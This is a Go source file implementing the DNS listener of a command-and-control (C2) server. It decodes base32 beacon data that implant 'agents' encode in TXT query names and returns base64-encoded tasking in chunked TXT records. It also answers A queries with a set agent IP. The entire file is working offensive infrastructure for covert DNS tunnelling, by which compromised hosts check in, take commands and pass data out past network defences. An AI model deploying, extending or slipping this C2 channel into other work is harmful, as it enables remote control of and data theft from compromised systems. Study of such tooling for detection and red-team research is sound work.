package server

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"runtime/debug"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// DNSBeaconListener runs a DNS C2 server on a configurable UDP port.
// It handles TXT-type DNS queries for agent beaconing and A-type queries for stub resolution.
type DNSBeaconListener struct {
	sync.RWMutex
	Domain  string // e.g. "c2.example.com"
	ID      uint   // listener DB ID
	Addr    string // e.g. ":53" or ":5353"
	server  *dns.Server
	handler func(string, []byte) []byte // fn(agentID, requestJSON) → responseJSON
	AgentIP string
	running bool
}

// NewDNSBeaconListener creates a DNS C2 listener bound to addr (e.g. ":53").
func NewDNSBeaconListener(domain string, agentIP string, listenerID uint, addr string) *DNSBeaconListener {
	if addr == "" {
		addr = ":53"
	}
	return &DNSBeaconListener{
		Domain:  domain,
		ID:      listenerID,
		Addr:    addr,
		AgentIP: agentIP,
	}
}

// SetHandler sets the beacon processing callback
func (dl *DNSBeaconListener) SetHandler(fn func(string, []byte) []byte) {
	dl.handler = fn
}

// Start binds UDP :53 and serves DNS
func (dl *DNSBeaconListener) Start() error {
	dl.Lock()
	defer dl.Unlock()
	if dl.running {
		return nil
	}

	mux := dns.NewServeMux()
	mux.HandleFunc(".", dl.handleQuery)

	dl.server = &dns.Server{
		Addr:    dl.Addr,
		Net:     "udp",
		Handler: mux,
	}

	slog.Info("DNS C2 listener starting", "domain", dl.Domain, "addr", dl.Addr)
	go func() {
		dl.Lock()
		dl.running = true
		dl.Unlock()
		defer func() {
			if r := recover(); r != nil {
				slog.Error("recovered from panic", "err", r, "stack", string(debug.Stack()))
			}
		}()
		if err := dl.server.ListenAndServe(); err != nil {
			slog.Error("DNS C2 listener failed", "error", err)
			dl.Lock()
			dl.running = false
			dl.Unlock()
		}
	}()
	return nil
}

// Stop shuts down the DNS listener
func (dl *DNSBeaconListener) Stop() error {
	dl.Lock()
	defer dl.Unlock()
	if !dl.running || dl.server == nil {
		return nil
	}
	dl.running = false
	return dl.server.Shutdown()
}

// Close implements io.Closer for use with extraListeners map.
func (dl *DNSBeaconListener) Close() error {
	return dl.Stop()
}

// IsRunning returns whether the listener is active
func (dl *DNSBeaconListener) IsRunning() bool {
	dl.RLock()
	defer dl.RUnlock()
	return dl.running
}

// ── DNS Query Handler ──────────────────────────────────────────────────────────

func (dl *DNSBeaconListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		return
	}

	q := r.Question[0]
	qname := strings.TrimSuffix(q.Name, ".")

	if !strings.HasSuffix(strings.ToLower(qname), strings.ToLower(dl.Domain)) {
		m := new(dns.Msg)
		m.SetReply(r)
		m.SetRcode(r, dns.RcodeRefused)
		w.WriteMsg(m)
		return
	}

	switch q.Qtype {
	case dns.TypeA:
		dl.handleAType(w, r)
	case dns.TypeTXT:
		dl.handleTXTType(w, r)
	default:
		m := new(dns.Msg)
		m.SetReply(r)
		w.WriteMsg(m)
	}
}

func (dl *DNSBeaconListener) handleAType(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	ip := net.ParseIP(dl.AgentIP)
	if ip == nil {
		ip = net.ParseIP("127.0.0.1")
	}
	if ipv4 := ip.To4(); ipv4 != nil {
		rr, _ := dns.NewRR(fmt.Sprintf("%s A %s", r.Question[0].Name, ipv4.String()))
		m.Answer = append(m.Answer, rr)
	}
	w.WriteMsg(m)
}

// handleTXTType processes beacon TXT queries.
// Query format: <hex-uuid>[.<base32data>].dns.<domain>
//
//	<hex-uuid>:  32 hex chars (UUID without dashes)
//	<base32data>: optional base32-encoded JSON beacon request (no padding)
//	.dns.:       fixed tag separating agent data from the domain
//	<domain>:    the configured DNS domain
//
// Response TXT: base64-encoded beaconResponse JSON (split into 255-char chunks)
func (dl *DNSBeaconListener) handleTXTType(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	qname := strings.TrimSuffix(r.Question[0].Name, ".")

	// Strip the domain suffix to get the agent prefix
	prefix := strings.ToLower(qname)
	domainLower := strings.ToLower(dl.Domain)
	idx := strings.LastIndex(prefix, ".dns."+domainLower)
	if idx < 0 {
		addTXTRecord(m, r.Question[0].Name, "")
		w.WriteMsg(m)
		return
	}

	// Get everything before ".dns."
	agentPart := prefix[:idx]
	if agentPart == "" {
		addTXTRecord(m, r.Question[0].Name, "")
		w.WriteMsg(m)
		return
	}

	labels := strings.Split(agentPart, ".")
	agentID := labels[0]
	if len(agentID) > 64 {
		agentID = agentID[:64]
	}

	// If there are additional labels after the UUID, they contain base32-encoded data
	var requestData []byte
	if len(labels) > 1 {
		dataLabels := labels[1:]
		combined := ""
		for _, l := range dataLabels {
			combined += l
		}
		var decErr error
		requestData, decErr = decodeBase32NoPad(combined)
		if decErr != nil {
			requestData = nil
		}
	}

	dl.processBeacon(agentID, requestData, m, r)
	w.WriteMsg(m)
}

func (dl *DNSBeaconListener) processBeacon(agentID string, requestData []byte, m *dns.Msg, r *dns.Msg) {
	if dl.handler == nil {
		addTXTRecord(m, r.Question[0].Name, "")
		return
	}

	// If the query carried embedded JSON data, use it; otherwise build a minimal request
	var reqJSON []byte
	if len(requestData) > 0 {
		reqJSON = requestData
	} else {
		reqMap := map[string]string{"uuid": agentID}
		var err error
		reqJSON, err = json.Marshal(reqMap)
		if err != nil {
			slog.Error("Failed to marshal DNS request", "agent", agentID, "err", err)
			addTXTRecord(m, r.Question[0].Name, "")
			return
		}
	}

	respJSON := dl.handler(agentID, reqJSON)
	encoded := base64.StdEncoding.EncodeToString(respJSON)
	addTXTRecord(m, r.Question[0].Name, encoded)
}

func addTXTRecord(m *dns.Msg, name string, value string) {
	if value == "" {
		value = " "
	}
	for i := 0; i < len(value); i += DNSTXTChunkSize {
		end := i + DNSTXTChunkSize
		if end > len(value) {
			end = len(value)
		}
		chunk := value[i:end]
		rr, err := dns.NewRR(fmt.Sprintf("%s TXT \"%s\"", name, chunk))
		if err != nil {
			slog.Error("DNS NewRR failed", "err", err)
			continue
		}
		m.Answer = append(m.Answer, rr)
	}
}

// decodeBase32NoPad decodes base32 without padding characters
func decodeBase32NoPad(s string) ([]byte, error) {
	s = strings.ToUpper(s)
	pad := 8 - (len(s) % 8)
	if pad < 8 {
		s += strings.Repeat("=", pad)
	}
	return base32.StdEncoding.DecodeString(s)
}
